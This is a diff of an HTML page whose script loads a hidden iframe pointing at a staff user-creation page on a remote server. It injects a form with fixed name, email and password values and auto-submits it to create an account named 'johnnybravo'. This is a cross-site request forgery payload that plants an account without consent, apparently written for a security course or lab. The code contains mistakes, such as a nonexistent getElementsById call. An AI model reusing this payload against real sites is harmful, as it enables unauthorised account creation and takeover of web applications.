@@ -9,15 +9,19 @@
 <body>
     <iframe xmlns="http://www.w3.org/1999/xhtml" id="myid" src="https://104.198.208.81/red/public/staff/users/new.php" style="display:none;"></iframe>
     <script>
+            
         var iframe = document.getElementById('myid');
         var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
-        innerDoc.getElementsByName("first_name").value = "Johnny";
-        innerDoc.getElementsByName("last_name").value = "Bravo";
-        innerDoc.getElementsByName("username").value = "johnnybravo";
-        innerDoc.getElementsByName("email").value = "johnnybravo@gmail.com";
-        innerDoc.getElementsByName("password").value = "1111111111Aa/";
-        innerDoc.getElementsByName("confirm_password").value = "1111111111Aa/";
-        innerDoc.getElementsByName("submit").click();
+        innerDoc.write(`<form action="/staff/users/new.php" method="POST">
+            <input name="first_name" value="Johnny">
+            <input name="last_name" value="Bravo">
+            <input name="username" value="johnnybravo">
+            <input name="email" value="johnnybravo@gmail.com">
+            <input type="password" name="password" value="111111111Aa#">
+            <input type="password" name="confirm_password" value="111111111Aa#">
+            <input type="submit" id="myform" name="submit" value="Create">
+         </form>`);
+        innerDoc.getElementsById("myform").click();
     </script>
 </body>
 </html>
